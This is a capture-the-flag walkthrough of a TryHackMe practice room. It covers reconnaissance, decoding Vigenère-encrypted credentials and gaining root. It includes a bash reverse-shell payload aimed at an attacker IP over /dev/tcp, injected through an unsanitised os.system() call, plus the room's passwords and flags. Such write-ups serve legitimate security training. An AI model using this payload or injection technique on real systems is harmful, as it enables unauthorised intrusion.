# TryHackMe - Break Out The Cage

## Recon

Standard full port nmap scan to kick things off:

```
nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.153.200
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
```

Three ports, and one of them is straight up giving away anonymous FTP with a file just sitting there. Easy start.

Port 80 is a "diary" style site run by Cage himself, and it mentions his son Weston set the whole server up for him. Noted - that's our first username.

## Anonymous FTP

```
ftp 10.49.153.200
Name (10.49.153.200:lightningf4st): Anonymous
Password: 
230 Login successful.
ftp> ls -al
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
ftp> get dad_tasks
```

```
file dad_tasks
dad_tasks: ASCII text, with very long lines (396), with no line terminators
```

Grabbed it, checked the file type, now let's see what's inside:

```
cat dad_tasks
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

Classic base64 blob. Decoded it straight away:

```
cat dad_tasks | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

Still not readable, but the structure (capitalised first words, punctuation, sentence lengths) screams classic substitution cipher rather than more base64. Threw it into dCode's Vigenère decoder and let it do the cryptanalysis / brute force the key. Turns out the key is `NAMELESSTWO`, and it decrypts to:

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

Anddd there it is - a wall of text that turns out to be a password: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`. Combine that with the username `weston` from the diary site and we've got SSH creds.

## Initial Access

```
ssh weston@10.49.153.200
weston@10.49.153.200's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
```

We're in as weston. Home directory is basically empty:

```
weston@national-treasure:~$ ls -al
lrwxrwxrwx 1 weston weston    9 May 26  2020 .bash_history -> /dev/null
drwx------ 2 weston weston 4096 May 26  2020 .cache
drwx------ 3 weston weston 4096 May 26  2020 .gnupg
```

Nothing juicy here, so straight to the usual privesc checks:

```
weston@national-treasure:~$ sudo -l
[sudo] password for weston: 
User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```

Weston can run `/usr/bin/bees` as root. Wanted to `strings` it first but the binary wasn't installed, so switched tactics and checked group memberships instead:

```
weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

Weston's in the `cage` group. Time to see what that gets us:

```
weston@national-treasure:~$ find / -type f -group cage 2>/dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```

## Privilege Escalation - Command Injection via wall()

`spread_the_quotes.py` is Dad's little script for spamming Nicholas Cage quotes to every terminal on the box:

```
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

And there it is - a beautiful, textbook command injection. It reads a random line out of `.quotes` and hands it straight to `os.system()` with zero sanitisation. Whatever's in that file gets executed as a shell command.

```
weston@national-treasure:~$ ls -al /opt/.dads_scripts/spread_the_quotes.py
-rwxr--r-- 1 cage cage 255 May 26  2020 /opt/.dads_scripts/spread_the_quotes.py
```

The script and quotes file are owned by `cage:cage`, and weston is a member of that group - meaning weston can write to `.quotes`. Combine that with the `sudo /usr/bin/bees` permission (which triggers this script), and we've got ourselves a privesc chain.

Set up a listener and dropped a reverse shell payload into the quotes file:

```
weston@national-treasure:~$ echo 'x; bash -c "bash -i >& /dev/tcp/192.168.140.36/4444 0>&1"; #' > /opt/.dads_scripts/.files/.quotes
```

Then triggered the script (via the sudo bees permission) to fire the payload:

```
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.140.36] from (UNKNOWN) [10.49.153.200] 41750
bash: cannot set terminal process group (1761): Inappropriate ioctl for device
bash: no job control in this shell
cage@national-treasure:~$
```

And we're in as `cage`.

## Loot as cage

```
cage@national-treasure:~$ ls
email_backup
Super_Duper_Checklist
```

Checked the checklist first:

```
cage@national-treasure:~$ cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
```

Anddd we got a flag hiding in plain sight in Dad's to-do list:

**FLAG: `THM{M37AL_0R_P3N_T35T1NG}`**

Nice little bonus for Cage worrying about his son's desk carvings instead of, y'know, server security.

## Email backup

Three saved emails sitting in `email_backup`:

```
cage@national-treasure:~/email_backup$ cat email_1
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

...rumours of a Face/Off sequel...
```

Email 1 is just Cage's agent Sean Archer talking about a possible Face/Off sequel - flavour text.

Email 2 is Cage moaning to his agent about not landing bigger roles, but there's a useful line at the bottom:

```
On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?
```

Confirms Sean Archer also has an account on the box - and Cage is asking if it's `root`.

Email 3 is the real one:

```
cage@national-treasure:~/email_backup$ cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me...

haiinspsyanileph
```

Another Vigenère candidate. Given the whole room is drowning in Nicholas Cage references, tried the obvious key first - `FACE` - and it clicked straight away:

```
haiinspsyanileph  --[Vigenère, key: FACE]-->  cageisnotalegend
```

Anddd there's Sean Archer's hidden password: `cageisnotalegend`. Savage, but on brand for an agent who won't get his client a Batman role.

## Root

Sean Archer's password from the email decode wasn't for a `seanarcher` account at all - tried it straight on `root`, and Cage's own suspicions turned out to be dead on:

```
weston@national-treasure:~$ sudo su
Sorry, user weston is not allowed to execute '/bin/su' as root on national-treasure.
weston@national-treasure:~$ su root
Password: 
root@national-treasure:/home/weston# cd /root
```

`cageisnotalegend` for root. Sean's been sitting on the highest privileges on the box this whole time, quietly wrecking Cage's career from the inside. Absolute snake.

```
root@national-treasure:~# ls -al
drwxr-xr-x  2 root root  4096 May 26  2020 email_backup
```

Of course there's more emails:

```
root@national-treasure:~/email_backup# cat *
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com
Good Evening Master
My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.
Thank you
Sean Archer

From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com
Dear Sean
I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
Thank you
Sean Archer
```

So the "agent" has secretly been working for some shadowy "Actors Guild" the whole time, deliberately sabotaging Cage's career one bad role at a time. Absolute soap opera. And tucked right in the middle of it, the final flag:

**FLAG: `THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}`**

Thanks for reading!
